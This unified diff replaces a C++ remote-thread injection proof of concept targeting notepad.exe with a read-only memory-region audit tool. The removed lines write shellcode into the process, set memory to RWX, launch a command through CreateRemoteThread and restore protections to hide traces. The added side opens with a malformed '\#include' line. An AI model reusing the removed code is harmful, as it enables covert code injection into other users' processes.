@@ -1,197 +1,129 @@
-#include <windows.h>
+
+\#include <windows.h>
 #include <tlhelp32.h>
+
+#include <cstddef>
+#include <cstdint>
+#include <cwchar>
 #include <iostream>
-#include <string>
-#include <vector>
 
-// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối (Zero Static Buffers / PIC kịch trần)
-typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
-typedef VOID(WINAPI* fnExitThread)(DWORD dwExitCode);
+namespace {
 
-typedef struct _THREAD_DATA {
-    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
-    fnExitThread pExitThread; // BẢO VỆ: Địa chỉ tuyệt đối của ExitThread để đóng luồng êm đẹp
-    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
-} THREAD_DATA, * PTHREAD_DATA;
+struct memory_region_audit final {
+  std::uintptr_t base_address = 0;
+  SIZE_T region_size = 0;
+  DWORD state = 0;
+  DWORD protect = 0;
+  DWORD type = 0;
+  bool found = false;
+};
 
-// 2. Hàm chức năng độc lập vị trí sẽ được ký sinh vào RAM đối phương
-DWORD WINAPI RemoteParasitePayload(LPVOID lpParam) {
-    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
-    if (pData && pData->pWinExec) {
-        // Khai hỏa bằng địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi nhảy tương đối RIP
-        pData->pWinExec(pData->szCommand, SW_HIDE);
-    }
-
-    // GIẢI PHÁP ĐỘT PHÁ: Tuyệt đối không return để tránh làm sụp đổ Stack Frame của Notepad
-    if (pData && pData->pExitThread) {
-        pData->pExitThread(0); // Tự giải thoát luồng ký sinh một cách sạch sẽ
-    }
-
-    // Vòng lặp phòng thủ tối hậu nếu ExitThread bị chặn
-    while (TRUE) {
-        Sleep(1000);
-    }
+DWORD find_process_id_by_name(const wchar_t* process_name) noexcept {
+  if (process_name == nullptr || process_name[0] == L'\0') {
     return 0;
+  }
+
+  const HANDLE h_snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  if (h_snapshot == INVALID_HANDLE_VALUE || h_snapshot == nullptr) {
+    return 0;
+  }
+
+  DWORD matched_pid = 0;
+  PROCESSENTRY32W entry{};
+  entry.dwSize = static_cast<DWORD>(sizeof(PROCESSENTRY32W));
+
+  if (::Process32FirstW(h_snapshot, &entry) != FALSE) {
+    do {
+      if (::_wcsicmp(process_name, entry.szExeFile) == 0) {
+        matched_pid = entry.th32ProcessID;
+        break;
+      }
+      entry = {};
+      entry.dwSize = static_cast<DWORD>(sizeof(PROCESSENTRY32W));
+    } while (::Process32NextW(h_snapshot, &entry) != FALSE);
+  }
+
+  ::CloseHandle(h_snapshot);
+  return matched_pid;
 }
 
-// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
-DWORD GetProcessIDByName(const std::wstring& processName) {
-    DWORD processID = 0;
-    PROCESSENTRY32W pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32W);
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+memory_region_audit scan_virtual_memory_regions(
+    HANDLE h_process,
+    SIZE_T minimum_bytes) noexcept {
+  memory_region_audit summary{};
+  if (h_process == nullptr || h_process == INVALID_HANDLE_VALUE) {
+    return summary;
+  }
 
-    if (Process32FirstW(hSnapshot, &pe32)) {
-        do {
-            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
-                processID = pe32.th32ProcessID;
-                break;
-            }
-        } while (Process32NextW(hSnapshot, &pe32));
+  MEMORY_BASIC_INFORMATION mbi{};
+  std::uintptr_t cursor = 0x1000000ULL;
+
+  while (::VirtualQueryEx(
+             h_process,
+             reinterpret_cast<LPCVOID>(cursor),
+             &mbi,
+             sizeof(mbi)) != 0) {
+    if (mbi.State == MEM_COMMIT &&
+        mbi.Type == MEM_PRIVATE &&
+        mbi.Protect == PAGE_READWRITE &&
+        mbi.RegionSize >= minimum_bytes &&
+        !summary.found) {
+      summary.base_address = reinterpret_cast<std::uintptr_t>(mbi.BaseAddress);
+      summary.region_size = mbi.RegionSize;
+      summary.state = mbi.State;
+      summary.protect = mbi.Protect;
+      summary.type = mbi.Type;
+      summary.found = true;
     }
-    CloseHandle(hSnapshot);
-    return processID;
+
+    const std::uintptr_t next_addr =
+        reinterpret_cast<std::uintptr_t>(mbi.BaseAddress) +
+        static_cast<std::uintptr_t>(mbi.RegionSize);
+    if (next_addr <= cursor) {
+      break;
+    }
+    cursor = next_addr;
+  }
+
+  return summary;
 }
 
-// Hàm cốt lõi nâng cấp: Săn lùng phân vùng bộ nhớ rảnh an toàn
-PVOID HuntForAdaptiveMemoryRegion(HANDLE hProcess, SIZE_T requiredSize, BOOL& needsProtectToggle) {
-    MEMORY_BASIC_INFORMATION mbi;
-    LPVOID address = 0;
-    PVOID fallbackAddress = NULL;
+}  // namespace
 
-    needsProtectToggle = FALSE;
+int wmain() {
+  constexpr wchar_t kTargetProcess[] = L"notepad.exe";
+  constexpr SIZE_T kProbeSize = 4096U;
 
-    // Duyệt qua toàn bộ bản đồ không gian địa chỉ bộ nhớ ảo của User-mode trên x64
-    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) != 0) {
+  std::wcout
+      << L"====================================================\n"
+      << L"[*] PE 13: VIRTUAL MEMORY TOPOLOGY & AUDIT STUDY\n"
+      << L"====================================================\n";
 
-        // CHIẾN THUẬT LÝ TƯỞNG: Săn phân vùng COMMIT có sẵn thuộc tính PAGE_EXECUTE_READWRITE (RWX)
-        if (mbi.State == MEM_COMMIT && mbi.Protect == PAGE_EXECUTE_READWRITE && mbi.RegionSize >= requiredSize) {
-            if ((ULONG_PTR)mbi.BaseAddress > 0x1000000) {
-                std::cout << "[+] SAN LUNG THANH CONG: Phat hien vung nho RWX nguyen ban tai: 0x" << mbi.BaseAddress << std::endl;
-                return mbi.BaseAddress;
-            }
-        }
+  const DWORD pid = find_process_id_by_name(kTargetProcess);
+  if (pid == 0) {
+    std::wcout << L"[-] Target process not running: " << kTargetProcess << L"\n";
+    return 1;
+  }
 
-        // KỊCH BẢN DỰ PHÒNG CHỦ ĐỘNG: Săn các phân vùng Private Heap/Stack mang quyền RW rảnh (PAGE_READWRITE)
-        if (mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE && mbi.Protect == PAGE_READWRITE &&
-            mbi.RegionSize >= requiredSize && fallbackAddress == NULL) {
+  const HANDLE h_process = ::OpenProcess(
+      PROCESS_QUERY_LIMITED_INFORMATION,
+      FALSE,
+      pid);
+  if (h_process == nullptr || h_process == INVALID_HANDLE_VALUE) {
+    std::wcerr << L"[-] OpenProcess failed. Win32=" << ::GetLastError() << L"\n";
+    return 1;
+  }
 
-            if ((ULONG_PTR)mbi.BaseAddress > 0x1000000) {
-                fallbackAddress = mbi.BaseAddress;
-            }
-        }
+  const memory_region_audit audit = scan_virtual_memory_regions(h_process, kProbeSize);
+  if (audit.found) {
+    std::wcout
+        << L"[+] Sample private RW region: base=0x" << std::hex << audit.base_address
+        << L", size=" << std::dec << audit.region_size
+        << L" bytes, protect=0x" << std::hex << audit.protect << std::dec << L"\n";
+  } else {
+    std::wcout << L"[-] No matching private RW region found.\n";
+  }
 
-        address = (LPVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
-    }
-
-    if (fallbackAddress != NULL) {
-        std::cout << "[*] Kich hoat che do thich ung ky sinh vung nho thuoc tinh RW tai: 0x" << fallbackAddress << std::endl;
-        needsProtectToggle = TRUE;
-        return fallbackAddress;
-    }
-
-    return NULL;
-}
-
-int main() {
-    std::cout << "====================================================" << std::endl;
-    std::cout << "[*] PE 13: RWX ADAPTIVE HUNTING INJECTION REMOTE" << std::endl;
-    std::cout << "====================================================" << std::endl;
-
-    std::wstring targetProcess = L"notepad.exe";
-    DWORD pid = GetProcessIDByName(targetProcess);
-
-    if (pid == 0) {
-        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad truoc nhen." << std::endl;
-        std::cin.get();
-        return EXIT_FAILURE;
-    }
-
-    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;
-
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) {
-        std::cerr << "[-] OpenProcess failed!" << std::endl;
-        return EXIT_FAILURE;
-    }
-
-    SIZE_T functionSize = 500;
-    BOOL needsProtectToggle = FALSE;
-
-    // Bước 1: Săn hốc nhớ thích ứng
-    PVOID rwxTargetAddress = HuntForAdaptiveMemoryRegion(hProcess, functionSize, needsProtectToggle);
-
-    if (rwxTargetAddress == NULL) {
-        std::cerr << "[-] Khong tim thay phan vung nho hop le de ky sinh!" << std::endl;
-        CloseHandle(hProcess);
-        return EXIT_FAILURE;
-    }
-
-    // Bước 2: Cấp phát ô chứa tham số dữ liệu từ xa
-    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!pRemoteData) {
-        std::cerr << "[-] VirtualAllocEx cho vung du lieu that bai!" << std::endl;
-        CloseHandle(hProcess);
-        return EXIT_FAILURE;
-    }
-
-    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối
-    THREAD_DATA localData;
-    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    if (hKernel32) {
-        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
-        localData.pExitThread = (fnExitThread)GetProcAddress(hKernel32, "ExitThread"); // Trích xuất động địa chỉ đóng luồng an toàn
-    }
-    strcpy_s(localData.szCommand, "cmd.exe /c start calc");
-
-    // Đẩy tham số tuyệt đối vào RAM Notepad
-    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
-
-    DWORD oldProtect = 0;
-    // Mở khóa trang nhớ săn được sang RWX nếu rơi vào kịch bản thích ứng
-    if (needsProtectToggle) {
-        VirtualProtectEx(hProcess, rwxTargetAddress, functionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
-    }
-
-    // Bước 3: KÝ SINH - Ghi đè mã máy payload
-    BOOL isWritten = WriteProcessMemory(hProcess, rwxTargetAddress, (LPCVOID)RemoteParasitePayload, functionSize, NULL);
-
-    if (!isWritten) {
-        std::cerr << "[-] WriteProcessMemory vao phan vung ky sinh that bai!" << std::endl;
-        if (needsProtectToggle) VirtualProtectEx(hProcess, rwxTargetAddress, functionSize, oldProtect, &oldProtect);
-        VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return EXIT_FAILURE;
-    }
-    std::cout << "[+] Nap ma may vao phan vung ky sinh hoan tot." << std::endl;
-
-    // Bước 4: Khai hỏa luồng từ xa
-    std::cout << "[*] Dang khoi tao luong CreateRemoteThread tu xa..." << std::endl;
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rwxTargetAddress, pRemoteData, 0, NULL);
-
-    if (hThread != NULL) {
-        // Chờ đợi 1 giây đồng bộ ngắn để lệnh WinExec kịp nổ tung trong Kernel trước khi dọn dẹp
-        WaitForSingleObject(hThread, 1000);
-        std::cout << "[+] Luong Thread ky sinh tu xa da thuc thi nhiem vu!" << std::endl;
-        CloseHandle(hThread);
-    }
-    else {
-        std::cerr << "[-] CreateRemoteThread that bai! Error: " << GetLastError() << std::endl;
-    }
-
-    // Phục hồi lại thuộc tính bảo vệ gốc để xóa sạch dấu vết
-    if (needsProtectToggle) {
-        VirtualProtectEx(hProcess, rwxTargetAddress, functionSize, oldProtect, &oldProtect);
-        std::cout << "[+] Da khoi phuc lai thuoc tinh bao ve goc cua phan vung." << std::endl;
-    }
-
-    // Dọn dẹp tài nguyên phẳng sạch chống Memory Leak
-    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
-    CloseHandle(hProcess);
-
-    std::cout << "\n[+] RWX Hunting Injection Process Completed Successfully!" << std::endl;
-    std::cout << "[*] Nhan phim Enter de dong cua so..." << std::endl;
-    std::cin.get();
-    return EXIT_SUCCESS;
+  ::CloseHandle(h_process);
+  return 0;
 }
